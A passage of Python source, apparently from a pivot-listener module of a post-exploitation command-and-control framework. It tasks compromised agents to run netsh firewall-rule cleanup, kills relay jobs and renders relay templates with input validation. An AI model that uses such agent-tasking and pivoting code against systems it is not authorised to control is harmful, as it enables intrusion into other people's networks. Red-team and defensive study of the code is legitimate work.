                agent = self.mainMenu.agentsv2.get_by_id(db, agent_session_id)
                if agent is None:
                    log.warning(
                        f"{listener_name}: cannot queue firewall cleanup — "
                        f"agent {agent_session_id} not found"
                    )
                    return
                _, err = self.mainMenu.agenttasksv2.create_task_shell(
                    db,
                    agent,
                    f'netsh advfirewall firewall delete rule name="{rule_name}"',
                )
                if err:
                    log.warning(
                        f"{listener_name}: failed to queue firewall cleanup "
                        f"({rule_name}): {err}"
                    )
        except Exception:
            log.warning(f"{listener_name}: firewall cleanup raised", exc_info=True)

    def shutdown(self):
        """
        If a server component was started, implement the logic that kills the particular
        named listener here.
        """
        name = self.options["Name"]["Value"]
        self.instance_log.info(f"{name}: shutting down...")
        log.info(f"{name}: shutting down...")

        try:
            with SessionLocal.begin() as db:
                agent = self.mainMenu.agentsv2.get_by_id(
                    db, self.options["Agent"]["Value"]
                )
                if agent is None:
                    log.error(
                        f"{name}: agent {self.options['Agent']['Value']} not found"
                    )
                    return

                language = agent.language.lower()
                listen_port = self.options["ListenPort"]["Value"]

                # Always queue the firewall-rule cleanup for Windows agents — the
                # rule name is deterministic from session_id+listen_port, so even
                # after a server restart (which loses _relay_task_id) we can
                # remove it without operator intervention.
                if language in ("powershell", "csharp", "go"):
                    rule_name = _firewall_rule_name(agent.session_id, listen_port)
                    _, fw_err = self.mainMenu.agenttasksv2.create_task_shell(
                        db,
                        agent,
                        f'netsh advfirewall firewall delete rule name="{rule_name}"',
                    )
                    if fw_err:
                        log.error(
                            f"{name}: failed to queue firewall rule delete ({rule_name}): {fw_err} — rule may be orphaned on agent"
                        )

                if self._relay_task_id is None:
                    log.warning(
                        f"{name}: relay task id unknown — operator must stop the relay job manually on agent {agent.session_id} via 'jobs' / 'kill'"
                    )
                    return

                _, kill_err = self.mainMenu.agenttasksv2.create_task_kill_job(
                    db, agent, str(self._relay_task_id)
                )
                if kill_err:
                    log.error(
                        f"{name}: failed to queue relay job kill: {kill_err} — task id retained for retry"
                    )
                    return

                self.mainMenu.agentsv2.save_agent_log(
                    agent.session_id,
                    f"Tasked agent to uninstall Pivot listener (kill relay job {self._relay_task_id})",
                )
                self._relay_task_id = None
        except Exception as e:
            log.error(
                f'Listener "{name}" failed to shutdown cleanly: {e}', exc_info=True
            )

    def _render_relay(
        self,
        template_name: str,
        listen_host: str,
        listen_port,
        connect_host: str,
        connect_port,
    ) -> str:
        # Defense in depth: start() already validates these, but anything
        # that calls _render_relay directly (e.g. tests) gets the same
        # protection against template-injection.
        listen_host = _validate_host(listen_host, "listen_host")
        connect_host = _validate_host(connect_host, "connect_host")
        listen_port = _validate_port(listen_port, "listen_port")
        connect_port = _validate_port(connect_port, "connect_port")
        template_path = [
            self.mainMenu.install_path / "listeners",
        ]
        eng = templating.TemplateEngine(template_path)
        template = eng.get_template(template_name)
        return template.render(
            listen_host=listen_host,
            listen_port=listen_port,
            connect_host=connect_host,
            connect_port=connect_port,
        )
